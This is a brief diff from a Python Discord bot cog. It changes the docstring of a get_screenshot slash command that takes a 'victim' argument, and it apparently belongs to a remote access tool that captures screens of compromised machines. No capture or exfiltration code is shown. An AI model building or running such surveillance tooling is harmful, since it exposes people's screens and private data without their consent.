@@ -12,7 +12,7 @@ class GetScreenshot(commands.Cog):
 
     @commands.slash_command()
     async def get_screenshot(self, ctx, victim):
-        """Sends screenshot of entire monitor
+        """Sends screenshot of the primary monitor
 
         Parameters
         ----------
